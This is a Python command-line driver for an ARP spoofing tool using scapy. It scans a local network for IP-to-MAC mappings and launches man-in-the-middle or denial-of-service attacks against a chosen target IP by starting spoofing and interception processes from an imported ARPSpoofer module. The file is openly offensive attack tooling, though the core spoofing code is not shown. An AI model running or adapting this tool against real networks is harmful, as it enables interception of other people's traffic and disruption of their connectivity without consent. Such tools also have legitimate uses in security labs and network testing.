from logging import basicConfig, DEBUG, getLogger, WARNING
from scapy.all import *
from multiprocessing import Process
from arpSpoofer import ARPSpoofer
from argparse import ArgumentParser
from json import dumps
import signal
import sys

logger = getLogger(__name__)
procs = []

def start_mitm_process(arp):
    proc = Process(target=arp.mitm_func)
    proc.start()
    procs.append(proc)
    logger.debug("Started mitm process")

def start_spoofing_process(arp):
    proc = Process(target=arp.spoofing_func)
    proc.start()
    procs.append(proc)
    logger.debug("Started spoofing process")


if __name__ == '__main__':
    ap = ArgumentParser()
    ap.add_argument("-d", "--debug", action="store_true", help="enable debug logging")
    ap.add_argument("--status", action="store_true", help="check network status and info")
    ap.add_argument("--task", help="Values: attack, scan")
    args = ap.parse_args()

    arp = ARPSpoofer()
    if args.debug:
        basicConfig(level=DEBUG)
    else:
        basicConfig(level=WARNING)

    if args.status:
        print({
            "gateway_ip": arp.gateway_ip,
            "gateway_mac": arp.gateway_mac,
            "interface": arp.interface,
            "subnet_mask": arp.subnet_mask,
            "host_ip": arp.host_ip,
            "host_mac": arp.host_mac
        })

    if args.task == 'scan':
        ap.add_argument(
            "--scan_method",
            help="scan local network for ip-mac mapping, Values: arp_resolve, arp, nmap_resolve, nmap",
        )
        args = ap.parse_args()
        print(args)

        if args.scan_method == None:
            print("Enter scan method")
            sys.exit(0)
        # arp_scan('172.16.5.0/24')
        print(dumps(arp.scan_network(args.scan_method),indent=4))
    elif args.task == 'attack':
        ap.add_argument(
            "--target_ip", type=str, help="Target IP address 1"
        )
        ap.add_argument(
            "--attack_type", type=str, help="Attack type, values - mitm/dos"
        )
        args = ap.parse_args()
        print(args)

        if args.target_ip == None or args.attack_type == None:
            print("Enter target ip and attack type")
            sys.exit(0)

        arp.spoof_client(args.target_ip, args.attack_type)
        start_spoofing_process(arp)
        start_mitm_process(arp)

        def signal_handler(sig, frame):
            print('You pressed Ctrl+C!')
            for proc in procs:
                proc.terminate()
            sys.exit(1)

        signal.signal(signal.SIGINT, signal_handler)
        signal.pause()
